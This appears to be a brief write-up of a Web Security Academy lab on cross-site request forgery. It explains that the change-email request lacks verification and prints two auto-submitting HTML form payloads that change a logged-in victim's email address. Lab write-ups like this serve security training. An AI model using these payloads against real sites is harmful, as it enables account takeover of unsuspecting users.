# CSRF Vulnerability

Afte Logging with the ```username:password``` given, we surf to change email page! when looking into the request, we check that there's no verification before submiting the request! means we can send to a target the url with the new email inside the url using ```POST``` request.

![****](/CSRF/Screenshots/cssf1.PNG)

## Let generate some Payloads!

CSRF PoC Generator
	- https://security.love/CSRF-PoC-Genorator/

```php
﻿<html>
<form enctype="multipart/form-data" method="POST" action="X.web-security-academy.net/my-account/change-email">
	<table>
		<tr>
			<td>email</td>
			<td><input type="text" value="just@aa.aa" name="email"></td>
		</tr>
	</table>
		<input type="submit" value="https://ac9f1f6a1f9ccdd0c06604330076008b.web-security-academy.net/my-account/change-email">
	</form>
</html>
<script>
	document.forms[0].submit();
</script>
```

Here's another payload!

```php
<form method="POST" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
</form>
<script>
	document.forms[0].submit();
</script>
```